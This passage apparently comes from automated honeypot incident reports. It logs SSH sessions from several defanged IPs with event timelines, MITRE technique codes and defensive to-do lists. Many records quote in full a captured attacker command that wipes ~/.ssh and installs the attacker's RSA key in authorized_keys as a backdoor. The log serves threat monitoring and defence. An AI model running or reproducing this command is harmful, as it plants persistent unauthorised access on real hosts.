| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:46:36` | `cowrie.session.connect` |
| `2026-05-26 14:46:36` | `cowrie.client.version` |
| `2026-05-26 14:46:37` | `cowrie.client.kex` |
| `2026-05-26 14:46:39` | `cowrie.login.success` |
| `2026-05-26 14:46:40` | `cowrie.session.params` |
| `2026-05-26 14:46:40` | `cowrie.command.input` |
| `2026-05-26 14:46:40` | `cowrie.command.failed` |
| `2026-05-26 14:46:40` | `cowrie.log.closed` |
| `2026-05-26 14:46:40` | `cowrie.session.params` |
| `2026-05-26 14:46:40` | `cowrie.command.input` |
| `2026-05-26 14:46:41` | `cowrie.session.file_download` |
| `2026-05-26 14:46:41` | `cowrie.log.closed` |
| `2026-05-26 14:46:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.126[.]104` to AbuseIPDB if not already reported
- [ ] Block `14.103.126[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bac647f8e6c

| Field | Detail |
|---|---|
| **Source IP** | `14.103.126[.]104` |
| **First Seen** | 2026-05-26 14:46 |
| **Last Seen** | 2026-05-26 14:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:46:44` | `cowrie.session.connect` |
| `2026-05-26 14:46:44` | `cowrie.client.version` |
| `2026-05-26 14:46:45` | `cowrie.client.kex` |
| `2026-05-26 14:46:45` | `cowrie.login.success` |
| `2026-05-26 14:46:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.126[.]104` to AbuseIPDB if not already reported
- [ ] Block `14.103.126[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c59134e4875

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]133` |
| **First Seen** | 2026-05-26 14:48 |
| **Last Seen** | 2026-05-26 14:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:48:27` | `cowrie.session.connect` |
| `2026-05-26 14:48:27` | `cowrie.client.version` |
| `2026-05-26 14:48:27` | `cowrie.client.kex` |
| `2026-05-26 14:48:28` | `cowrie.login.success` |
| `2026-05-26 14:48:28` | `cowrie.session.params` |
| `2026-05-26 14:48:28` | `cowrie.command.input` |
| `2026-05-26 14:48:28` | `cowrie.command.failed` |
| `2026-05-26 14:48:28` | `cowrie.log.closed` |
| `2026-05-26 14:48:28` | `cowrie.session.params` |
| `2026-05-26 14:48:28` | `cowrie.command.input` |
| `2026-05-26 14:48:28` | `cowrie.session.file_download` |
| `2026-05-26 14:48:28` | `cowrie.log.closed` |
| `2026-05-26 14:48:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]133` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2b9b880a4df

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]133` |
| **First Seen** | 2026-05-26 14:48 |
| **Last Seen** | 2026-05-26 14:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:48:30` | `cowrie.session.connect` |
| `2026-05-26 14:48:30` | `cowrie.client.version` |
| `2026-05-26 14:48:30` | `cowrie.client.kex` |
| `2026-05-26 14:48:31` | `cowrie.login.success` |
| `2026-05-26 14:48:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]133` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-793f617fc37c

| Field | Detail |
|---|---|
| **Source IP** | `14.103.126[.]104` |
| **First Seen** | 2026-05-26 14:49 |
| **Last Seen** | 2026-05-26 14:49 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:49:35` | `cowrie.session.connect` |
| `2026-05-26 14:49:35` | `cowrie.client.version` |
| `2026-05-26 14:49:35` | `cowrie.client.kex` |
| `2026-05-26 14:49:37` | `cowrie.login.success` |
| `2026-05-26 14:49:37` | `cowrie.session.params` |
| `2026-05-26 14:49:37` | `cowrie.command.input` |
| `2026-05-26 14:49:37` | `cowrie.command.failed` |
| `2026-05-26 14:49:38` | `cowrie.log.closed` |
| `2026-05-26 14:49:38` | `cowrie.session.params` |
| `2026-05-26 14:49:38` | `cowrie.command.input` |
| `2026-05-26 14:49:39` | `cowrie.session.file_download` |
| `2026-05-26 14:49:39` | `cowrie.log.closed` |
| `2026-05-26 14:49:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.126[.]104` to AbuseIPDB if not already reported
- [ ] Block `14.103.126[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd1397cec479

| Field | Detail |
|---|---|
| **Source IP** | `14.103.126[.]104` |
| **First Seen** | 2026-05-26 14:49 |
| **Last Seen** | 2026-05-26 14:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:49:45` | `cowrie.session.connect` |
| `2026-05-26 14:49:45` | `cowrie.client.version` |
| `2026-05-26 14:49:45` | `cowrie.client.kex` |
| `2026-05-26 14:49:46` | `cowrie.login.success` |
| `2026-05-26 14:49:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.126[.]104` to AbuseIPDB if not already reported
- [ ] Block `14.103.126[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07d5dce1de71

| Field | Detail |
|---|---|
| **Source IP** | `180.76.98[.]88` |
| **First Seen** | 2026-05-26 14:50 |
| **Last Seen** | 2026-05-26 14:50 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:50:02` | `cowrie.session.connect` |
| `2026-05-26 14:50:02` | `cowrie.client.version` |
| `2026-05-26 14:50:03` | `cowrie.client.kex` |
| `2026-05-26 14:50:05` | `cowrie.login.success` |
| `2026-05-26 14:50:05` | `cowrie.session.params` |
| `2026-05-26 14:50:05` | `cowrie.command.input` |
| `2026-05-26 14:50:05` | `cowrie.command.failed` |
| `2026-05-26 14:50:06` | `cowrie.log.closed` |
| `2026-05-26 14:50:06` | `cowrie.session.params` |
| `2026-05-26 14:50:06` | `cowrie.command.input` |
| `2026-05-26 14:50:06` | `cowrie.session.file_download` |
| `2026-05-26 14:50:06` | `cowrie.log.closed` |
| `2026-05-26 14:50:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.98[.]88` to AbuseIPDB if not already reported
- [ ] Block `180.76.98[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-269257fb7388

| Field | Detail |
|---|---|
| **Source IP** | `180.76.98[.]88` |
| **First Seen** | 2026-05-26 14:50 |
| **Last Seen** | 2026-05-26 14:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:50:10` | `cowrie.session.connect` |
| `2026-05-26 14:50:10` | `cowrie.client.version` |
| `2026-05-26 14:50:11` | `cowrie.client.kex` |
| `2026-05-26 14:50:13` | `cowrie.login.success` |
| `2026-05-26 14:50:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.98[.]88` to AbuseIPDB if not already reported
- [ ] Block `180.76.98[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a287bed3bb2

| Field | Detail |
|---|---|
| **Source IP** | `14.103.126[.]104` |
| **First Seen** | 2026-05-26 14:51 |
| **Last Seen** | 2026-05-26 14:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:51:24` | `cowrie.session.connect` |
| `2026-05-26 14:51:24` | `cowrie.client.version` |
| `2026-05-26 14:51:24` | `cowrie.client.kex` |
| `2026-05-26 14:51:25` | `cowrie.login.success` |
| `2026-05-26 14:51:25` | `cowrie.session.params` |
| `2026-05-26 14:51:25` | `cowrie.command.input` |
| `2026-05-26 14:51:25` | `cowrie.command.failed` |
| `2026-05-26 14:51:25` | `cowrie.log.closed` |
| `2026-05-26 14:51:26` | `cowrie.session.params` |
| `2026-05-26 14:51:26` | `cowrie.command.input` |
| `2026-05-26 14:51:26` | `cowrie.session.file_download` |
| `2026-05-26 14:51:26` | `cowrie.log.closed` |
| `2026-05-26 14:51:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.126[.]104` to AbuseIPDB if not already reported
- [ ] Block `14.103.126[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9622fd3aeee

| Field | Detail |
|---|---|
| **Source IP** | `14.103.126[.]104` |
| **First Seen** | 2026-05-26 14:51 |
| **Last Seen** | 2026-05-26 14:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:51:31` | `cowrie.session.connect` |
| `2026-05-26 14:51:31` | `cowrie.client.version` |
| `2026-05-26 14:51:31` | `cowrie.client.kex` |
| `2026-05-26 14:51:32` | `cowrie.login.success` |
| `2026-05-26 14:51:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.126[.]104` to AbuseIPDB if not already reported
- [ ] Block `14.103.126[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c41f66911a9

| Field | Detail |
|---|---|
| **Source IP** | `14.103.126[.]104` |
| **First Seen** | 2026-05-26 14:51 |
| **Last Seen** | 2026-05-26 14:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:51:54` | `cowrie.session.connect` |
| `2026-05-26 14:51:54` | `cowrie.client.version` |
| `2026-05-26 14:51:55` | `cowrie.client.kex` |
| `2026-05-26 14:51:57` | `cowrie.login.success` |
| `2026-05-26 14:51:58` | `cowrie.session.params` |
| `2026-05-26 14:51:58` | `cowrie.command.input` |
| `2026-05-26 14:51:58` | `cowrie.command.failed` |
| `2026-05-26 14:51:58` | `cowrie.log.closed` |
| `2026-05-26 14:51:58` | `cowrie.session.params` |
| `2026-05-26 14:51:58` | `cowrie.command.input` |
| `2026-05-26 14:51:59` | `cowrie.session.file_download` |
| `2026-05-26 14:51:59` | `cowrie.log.closed` |
| `2026-05-26 14:52:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.126[.]104` to AbuseIPDB if not already reported
- [ ] Block `14.103.126[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdab4ea6d228

| Field | Detail |
|---|---|
| **Source IP** | `14.103.126[.]104` |
| **First Seen** | 2026-05-26 14:52 |
| **Last Seen** | 2026-05-26 14:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:52:02` | `cowrie.session.connect` |
| `2026-05-26 14:52:02` | `cowrie.client.version` |
| `2026-05-26 14:52:02` | `cowrie.client.kex` |
| `2026-05-26 14:52:03` | `cowrie.login.success` |
| `2026-05-26 14:52:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.126[.]104` to AbuseIPDB if not already reported
- [ ] Block `14.103.126[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46c6b41f4b1a

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]133` |
| **First Seen** | 2026-05-26 14:52 |
| **Last Seen** | 2026-05-26 14:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:52:21` | `cowrie.session.connect` |
| `2026-05-26 14:52:21` | `cowrie.client.version` |
| `2026-05-26 14:52:21` | `cowrie.client.kex` |
| `2026-05-26 14:52:22` | `cowrie.login.success` |
| `2026-05-26 14:52:22` | `cowrie.session.params` |
| `2026-05-26 14:52:22` | `cowrie.command.input` |
| `2026-05-26 14:52:22` | `cowrie.command.failed` |
| `2026-05-26 14:52:22` | `cowrie.log.closed` |
| `2026-05-26 14:52:22` | `cowrie.session.params` |
| `2026-05-26 14:52:22` | `cowrie.command.input` |
| `2026-05-26 14:52:22` | `cowrie.session.file_download` |
| `2026-05-26 14:52:22` | `cowrie.log.closed` |
| `2026-05-26 14:52:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]133` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d44d15b6605f

| Field | Detail |
|---|---|
| **Source IP** | `101.79.165[.]133` |
| **First Seen** | 2026-05-26 14:52 |
| **Last Seen** | 2026-05-26 14:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:52:24` | `cowrie.session.connect` |
| `2026-05-26 14:52:24` | `cowrie.client.version` |
| `2026-05-26 14:52:24` | `cowrie.client.kex` |
| `2026-05-26 14:52:25` | `cowrie.login.success` |
| `2026-05-26 14:52:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.79.165[.]133` to AbuseIPDB if not already reported
- [ ] Block `101.79.165[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fe33d910419

| Field | Detail |
|---|---|
| **Source IP** | `14.103.126[.]104` |
| **First Seen** | 2026-05-26 14:53 |
| **Last Seen** | 2026-05-26 14:53 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:53:07` | `cowrie.session.connect` |
| `2026-05-26 14:53:07` | `cowrie.client.version` |
| `2026-05-26 14:53:07` | `cowrie.client.kex` |
| `2026-05-26 14:53:08` | `cowrie.login.success` |
| `2026-05-26 14:53:08` | `cowrie.session.params` |
| `2026-05-26 14:53:08` | `cowrie.command.input` |
| `2026-05-26 14:53:08` | `cowrie.command.failed` |
| `2026-05-26 14:53:10` | `cowrie.log.closed` |
| `2026-05-26 14:53:10` | `cowrie.session.params` |
| `2026-05-26 14:53:10` | `cowrie.command.input` |
| `2026-05-26 14:53:10` | `cowrie.session.file_download` |
| `2026-05-26 14:53:10` | `cowrie.log.closed` |
| `2026-05-26 14:53:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.126[.]104` to AbuseIPDB if not already reported
- [ ] Block `14.103.126[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-751ec6c6be00

| Field | Detail |
|---|---|
| **Source IP** | `14.103.126[.]104` |
| **First Seen** | 2026-05-26 14:53 |
| **Last Seen** | 2026-05-26 14:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:53:16` | `cowrie.session.connect` |
| `2026-05-26 14:53:16` | `cowrie.client.version` |
| `2026-05-26 14:53:17` | `cowrie.client.kex` |
| `2026-05-26 14:53:17` | `cowrie.login.success` |
| `2026-05-26 14:53:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.126[.]104` to AbuseIPDB if not already reported
- [ ] Block `14.103.126[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44a45c4d6d48

| Field | Detail |
|---|---|
| **Source IP** | `183.91.186[.]36` |
| **First Seen** | 2026-05-26 14:55 |
| **Last Seen** | 2026-05-26 14:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 14:55:19` | `cowrie.session.connect` |
| `2026-05-26 14:55:19` | `cowrie.client.version` |
| `2026-05-26 14:55:19` | `cowrie.client.kex` |
| `2026-05-26 14:55:20` | `cowrie.login.success` |
| `2026-05-26 14:55:20` | `cowrie.session.params` |
| `2026-05-26 14:55:20` | `cowrie.command.input` |
